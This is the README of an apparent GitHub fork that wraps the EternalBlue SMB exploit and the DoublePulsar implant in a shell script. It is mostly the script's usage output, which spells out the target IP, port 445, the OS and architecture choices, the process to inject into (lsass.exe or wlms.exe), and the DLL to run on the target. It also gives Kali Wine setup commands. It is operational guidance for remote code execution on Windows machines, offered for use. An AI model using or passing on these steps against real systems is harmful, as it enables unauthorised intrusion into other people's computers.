# Eternalblue-Doublepulsar-Metasploit

Original Source: https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit

Added shell script to run EternalBlue exploit along with DoublePulsar to execute a DLL.

```
root@kali:/opt/Eternalblue-Doublepulsar-Metasploit# bash eternalblue-exploit.sh

Usage: externalblue-exploit.sh <TARGET_IP> <TARGET_PORT> <TIMEOUT> <TARGET_OS> <ARCH> <INJECT_TO_PROCESS> <DLL_FILE>

TARGET_IP: Target you want to exploit
TARGET_PORT: In most cases it is 445
TIMEOUT: Number of seconds for timeout
TARGET_OS: Enter XP or WIN72K8R2
ARCH: Architecture of target. Enter x86 or x64
INJECT_TO_PROCESS: Enter lsass.exe for x64 and wlms.exe for x86
DLL_FILE: Absolute path to DLL to execute on target

Note: If you are running 64-bit Kali then run the below mentioned commands to install Wine 32-bit:
dpkg --add-architecture i386
apt-get update
apt-get install -y wine32
```
